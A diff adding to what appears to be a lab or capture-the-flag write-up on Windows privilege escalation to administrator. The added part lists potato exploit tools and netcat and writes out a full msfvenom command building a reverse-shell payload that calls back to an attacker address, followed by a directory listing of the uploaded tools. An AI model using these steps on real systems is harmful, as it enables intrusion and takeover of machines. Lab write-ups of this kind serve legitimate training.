@@ -35,3 +35,30 @@ C:\Users\Public\desktop>
 
 From the above scenarion there many ways you can try to exploit this but actually i am making this one so i can easy simplfy my way in with this easy way to become administrator.
 
+## first thing were gonna need the following into our target machine 
+1. nc.exe (specific for windows)
+2. RoguePotato.exe
+3. JuicyPotato
+4. payload with msfvenom specific for windows(msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe)
+```
+C:\Users\Public\desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D582-9880
+
+ Directory of C:\Users\Public\desktop
+
+04/13/2024  08:59 AM    <DIR>          .
+04/13/2024  08:59 AM    <DIR>          ..
+04/13/2024  07:23 AM    <DIR>          Microsoft
+04/13/2024  06:59 AM            59,392 nc.exe
+04/13/2024  07:23 AM           347,648 potato.exe
+04/13/2024  08:59 AM           159,232 rogue.exe
+04/13/2024  07:28 AM             7,168 shell.exe
+04/13/2024  08:39 AM            27,136 spoofer.exe
+02/20/2020  03:14 AM             1,191 TeamViewer 7.lnk
+               7 File(s)        601,801 bytes
+               3 Dir(s)  13,362,515,968 bytes free
+```
+
+
